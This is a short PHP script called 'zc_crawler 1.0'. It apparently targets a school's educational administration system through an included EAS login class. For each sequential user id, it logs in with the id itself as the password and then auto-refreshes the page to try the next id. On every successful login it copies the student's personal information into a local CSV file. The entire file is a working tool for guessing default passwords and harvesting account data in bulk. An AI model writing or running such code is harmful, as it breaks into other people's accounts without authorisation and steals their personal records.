<?php
//zc_crawler 1.0
include_once('eas.php');
$id = $_GET['id'];
$pw = $_GET['pw'];
$eas = null;

if(empty($pw)){
	$eas = new EAS($id,$id);
	echo '<meta http-equiv="refresh" content="0.01;url=?id=' . ($id+1) .'">';
}else{
	$eas = new EAS($id,$pw);
}

$login = $eas->login();
if($login==1){
	$stu = $eas->getUserInfo('get');
	$csv = '';
	foreach ($stu as $key => $value) {
		$csv.= $value . ',';
	}
	$csv.="\r\n";
	file_put_contents("user.csv", $csv, FILE_APPEND);
}

print_r($stu);